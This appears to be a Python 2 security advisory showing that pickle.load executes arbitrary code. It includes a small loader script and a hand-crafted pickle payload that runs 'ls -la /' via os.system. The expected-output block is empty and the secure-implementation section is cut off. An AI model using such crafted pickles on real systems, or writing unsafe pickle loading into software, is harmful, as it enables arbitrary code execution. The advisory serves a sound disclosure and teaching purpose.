Unrestricted code execution using pickle
========================================

Classification
--------------------------

* **Affected Components** : pickle

* **Operating System** : Linux

* **Python Versions** : 2.6.x, 2.7.x

* **Reproducible** : Yes


Source code 
--------------------------

```python
import pickle

obj = pickle.load(open('./bug.pickle'))
print "== Object =="
print repr(obj)
```

And copy following text into a file named ```bug.pickle```

```python
cos
system
(S'ls -la /'
tR.

```

Then put this file in the same folder as the ```test.py``` file

Steps to Produce/Reproduce
--------------------------

To reproduce the problem copy the `source code` in a file and execute the script using the following command syntax:

```python
$ python -OOBRtt test.py
```

Alternatively you can open python in interactive mode:

```python
$ python -OOBRtt <press enter>
```
Then copy the lines of code into the interpreter.  


Description
-----------

The module ```pickle``` is not made with security in mind and can be used to execute any instruction with same permissions and  privileges as the user that is running the code.

In this case we have used ```pickle``` to load a file that contains a perfectly valid instruction that will be executed and will produce the following:

```

In fact ```pickle``` loaded the file and executed the code without any control.

***NEVER use ANYTHING that uses ```pickle``` or ```cPickle``` as this two libraries are NOT designed as safe/secure solution for data serialization.***


Workaround
-----------


We are not aware on any **easy** solution other than trying to avoid using ```'pickle'``` or ```'pickle'``` in cases like the one examined.


Secure Implementation
